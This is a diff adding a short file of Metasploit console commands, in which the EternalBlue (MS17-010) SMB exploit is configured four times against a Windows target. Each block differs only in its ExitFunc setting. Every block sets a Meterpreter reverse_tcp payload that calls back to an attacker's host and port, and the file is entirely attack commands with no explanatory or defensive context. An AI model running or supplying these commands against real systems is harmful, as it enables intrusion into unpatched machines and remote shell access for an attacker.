@@ -1,0 +1,35 @@
+# (') method
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <dirección IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <dirección IP del atacante>
+set LPORT <puerto local>
+set ExitFunc ''
+exploit
+
+# seh method
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <dirección IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <dirección IP del atacante>
+set LPORT <puerto local>
+set ExitFunc seh
+exploit
+
+# thread method
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <dirección IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <dirección IP del atacante>
+set LPORT <puerto local>
+set ExitFunc thread
+exploit
+
+# process method
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <dirección IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <dirección IP del atacante>
+set LPORT <puerto local>
+set ExitFunc process
+exploit
